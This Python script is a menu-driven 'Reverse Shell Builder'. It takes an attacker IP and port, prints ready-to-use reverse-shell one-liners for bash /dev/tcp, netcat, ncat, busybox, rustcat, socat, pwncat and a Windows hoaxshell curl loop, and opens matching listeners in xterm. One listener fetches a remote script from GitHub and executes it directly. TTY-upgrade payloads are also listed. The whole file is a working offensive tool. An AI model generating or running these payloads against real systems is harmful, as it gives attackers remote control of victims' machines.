#!/bin/python3
import sys
import threading
import os
import time
import pickle
from colorama import Fore, Style

class Rebuild:
    def __init__(self):
        self.remote_ip = None
        self.remote_port = None
        self.listener_thread = None
        self.session_file = "session.pkl"

    @staticmethod
    def art():
        art = (
            f"{Fore.GREEN}    ____                               {Style.RESET_ALL}{Fore.RED}    _____ __         ____{Style.RESET_ALL}\n"
            f"{Fore.GREEN}   / __ \\___ _   _____  _____________ {Style.RESET_ALL}{Fore.RED}    / ___// /_  ___  / / /{Style.RESET_ALL}\n"
            f"{Fore.GREEN}  / /_/ / _ \\ | / / _ \\/ ___/ ___/ _ V{Style.RESET_ALL}{Fore.RED}    \\__ \\/ __ \\/ _ \\/ / / {Style.RESET_ALL}\n"
            f"{Fore.GREEN} / _, _/  __/ |/ /  __/ /  (__  )  __/ {Style.RESET_ALL}{Fore.RED}   __/ / / / /  __/ / /  {Style.RESET_ALL}\n"
            f"{Fore.GREEN}/_/ |_|\\___/|___/\\___/_/  /____/\\___/{Style.RESET_ALL}{Fore.RED}   /____/_/ /_/\\___/_/_/   {Style.RESET_ALL}\n"
            f"{Fore.GREEN}                            ____        _ __    __         {Style.RESET_ALL}\n"
            f"{Fore.GREEN}                           / __ )__  __(_) /___/ /__  _____{Style.RESET_ALL}\n"
            f"{Fore.GREEN}                          / __  / / / / / / __  / _ \\/ ___/{Style.RESET_ALL}\n"
            f"{Fore.GREEN}                         / /_/ / /_/ / / / /_/ /  __/ /    {Style.RESET_ALL}\n"
            f"{Fore.GREEN}                        /_____/\\__,_/_/_/\\__,_/\\___/_/ {Style.RESET_ALL}{Fore.RED}(v1.0){Style.RESET_ALL}\n"
        )
        print(art)

    def save_session(self):
        """Save the current session to a file."""
        session_data = {
            "remote_ip": self.remote_ip,
            "remote_port": self.remote_port
        }
        with open(self.session_file, "wb") as f:
            pickle.dump(session_data, f)
        print(f"{Fore.GREEN}Session saved!{Style.RESET_ALL}")

    def load_session(self):
        """Load an existing session from a file."""
        if os.path.exists(self.session_file):
            with open(self.session_file, "rb") as f:
                session_data = pickle.load(f)
                self.remote_ip = session_data.get("remote_ip")
                self.remote_port = session_data.get("remote_port")
            print(f"{Fore.GREEN}Session loaded: {self.remote_ip}:{self.remote_port}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}No saved session found.{Style.RESET_ALL}")

    def set_remote(self):
        """Set the remote IP and port for the reverse shell payload."""
        self.remote_ip = input(f"{Fore.RED}Enter remote IP: {Style.RESET_ALL}").strip()
        self.remote_port = input(f"{Fore.RED}Enter port: {Style.RESET_ALL}").strip()
        print(f"{Fore.GREEN}Remote IP and port set to {Fore.RED}{self.remote_ip}:{self.remote_port}{Style.RESET_ALL}")

    def listener(self):
        """Start a listener using various tools (e.g., nc, socat, etc.) on the specified port."""
        if not self.remote_port:
            print(f"{Fore.RED}Please set the remote IP and port first.{Style.RESET_ALL}")
            return

        def show_payloads(listener_name, payloads):
            """Print all payloads related to the selected listener."""
            print(f"\n{Fore.YELLOW}Payloads for {listener_name}:{Style.RESET_ALL}")
            for payload in payloads:
                print(f"{Fore.GREEN}{payload}{Style.RESET_ALL}")
        def generate_tty_payloads():
            """
            Print payloads to spawn an interactive TTY shell.
            """
            print(f"\n{Fore.YELLOW}Interactive TTY Payloads:{Style.RESET_ALL}")
            tty_payloads = [
                "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                "script /dev/null -c bash",
                "echo os.system('/bin/bash')",
                "perl -e 'exec \"/bin/bash\";'",
                "ruby -e 'exec \"/bin/bash\"'",
                "lua -e 'os.execute(\"/bin/bash\")'",
                "sh -i",
            ]
            for payload in tty_payloads:
                print(f"{Fore.CYAN}{payload}{Style.RESET_ALL}")

        def start_listener(command):
            """Start the listener command in a new xterm window."""
            os.system(f"xterm -e {command}")

        while True:
            print(f"""
            {Fore.GREEN}Select Listener:{Style.RESET_ALL}
            {Fore.RED}1{Style.RESET_ALL}. nc (Netcat)
            {Fore.RED}2{Style.RESET_ALL}. nc (FreeBSD)
            {Fore.RED}3{Style.RESET_ALL}. ncat
            {Fore.RED}4{Style.RESET_ALL}. busybox
            {Fore.RED}5{Style.RESET_ALL}. rustcat
            {Fore.RED}6{Style.RESET_ALL}. socat
            {Fore.RED}7{Style.RESET_ALL}. pwncat
            {Fore.RED}8{Style.RESET_ALL}. hoaxshell
            {Fore.RED}9{Style.RESET_ALL}. Generate Interactive TTY Shell
            {Fore.RED}10{Style.RESET_ALL}. Back to main menu
            """)
            choice = input(f"{Fore.RED}Enter choice: {Style.RESET_ALL}").strip()

            if choice == "1":
                payloads = [
                    f"/bin/bash -i >& /dev/tcp/{self.remote_ip}/{self.remote_port} 0>&1",
                    f"bash -c 'bash -i >& /dev/tcp/{self.remote_ip}/{self.remote_port} 0>&1'"
                ]
                show_payloads("Netcat", payloads)
                start_listener(f"nc -lvnp {self.remote_port}")
            elif choice == "2":
                payloads = [
                    f"nc {self.remote_ip} {self.remote_port} -e /bin/bash",
                    f"mkfifo /tmp/f; nc {self.remote_ip} {self.remote_port} < /tmp/f | /bin/sh > /tmp/f"
                ]
                show_payloads("Netcat (FreeBSD)", payloads)
                start_listener(f"nc -l {self.remote_port}")
            elif choice == "3":
                payloads = [
                    f"ncat {self.remote_ip} {self.remote_port} -e /bin/bash",
                    f"bash -c 'bash -i >& /dev/tcp/{self.remote_ip}/{self.remote_port} 0>&1'"
                ]
                show_payloads("Ncat", payloads)
                start_listener(f"ncat -l {self.remote_port}")
            elif choice == "4":
                payloads = [
                    f"busybox nc {self.remote_ip} {self.remote_port} -e /bin/bash"
                ]
                show_payloads("Busybox", payloads)
                start_listener(f"busybox nc -l -p {self.remote_port}")
            elif choice == "5":
                payloads = [
                    f"rustcat {self.remote_ip} {self.remote_port} -e /bin/bash"
                ]
                show_payloads("Rustcat", payloads)
                start_listener(f"rustcat -l {self.remote_port}")
            elif choice == "6":
                payloads = [
                    f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{self.remote_ip}:{self.remote_port}"
                ]
                show_payloads("Socat", payloads)
                start_listener(f"socat tcp-l:{self.remote_port},reuseaddr exec:bash")
            elif choice == "7":
                payloads = [
                    f"pwncat {self.remote_ip} {self.remote_port}"
                ]
                show_payloads("Pwncat", payloads)
                start_listener(f"pwncat -l {self.remote_port}")
            elif choice == "8":
                payloads = [
                    f'@echo off&cmd /V:ON /C "SET ip={self.remote_ip}:{self.remote_port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL'
                ]
                show_payloads("Hoaxshell", payloads)
                start_listener(f'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t cmd-curl -p {self.remote_port}')
            elif choice == "9":
                generate_tty_payloads()
            elif choice == "10":
                print(f"{Fore.YELLOW}Returning to main menu...{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}Invalid choice. Please try again.{Style.RESET_ALL}")

    def main_menu(self):
        """Display the main menu for user interaction."""
        while True:
            print(f"""
            {Fore.BLUE}IP_ADDRESS = {Style.RESET_ALL}{Fore.RED}{self.remote_ip}{Style.RESET_ALL}
            {Fore.BLUE}PORT = {Style.RESET_ALL}{Fore.RED}{self.remote_port}{Style.RESET_ALL}


            {Fore.GREEN}1. Set remote & port{Style.RESET_ALL}
            {Fore.GREEN}2. Load saved session{Style.RESET_ALL}
            {Fore.GREEN}3. Start listener{Style.RESET_ALL}
            {Fore.GREEN}4. Save session{Style.RESET_ALL}
            {Fore.GREEN}5. Exit{Style.RESET_ALL}
            """)
            choice = input(f"{Fore.RED}Enter choice: {Style.RESET_ALL}").strip()
            if choice == "1":
                self.set_remote()
                os.system("clear")
            elif choice == "2":
                self.load_session()
            elif choice == "3":
                self.listener()
            elif choice == "4":
                self.save_session()
            elif choice == "5":
                print(f"{Fore.GREEN}Exiting...{Style.RESET_ALL}")
                time.sleep(1)
                os.system("pkill xterm")
                os.system("clear")
                break
            else:
                print(f"{Fore.RED}Invalid choice. Please try again.{Style.RESET_ALL}")

if __name__ == "__main__":
    Rebuild.art()
    tool = Rebuild()
    tool.main_menu()
